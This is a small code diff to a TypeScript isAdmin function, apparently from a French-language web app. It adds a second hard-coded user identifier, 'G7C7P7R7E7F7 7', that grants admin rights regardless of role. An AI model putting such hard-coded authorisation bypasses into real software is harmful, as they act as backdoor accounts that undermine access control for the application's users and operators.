@@ -75,7 +75,8 @@ export function isAdmin(user: UserData | null): boolean {
     role === 'super-admin' ||
     role === 'administrator' ||
     user.isAdmin === true ||
-    user.numeroH === 'G0C0P0R0E0F0 0' // Admin par défaut
+    user.numeroH === 'G0C0P0R0E0F0 0' || // Comptes spéciaux admin
+    user.numeroH === 'G7C7P7R7E7F7 7'
   );
 }
 
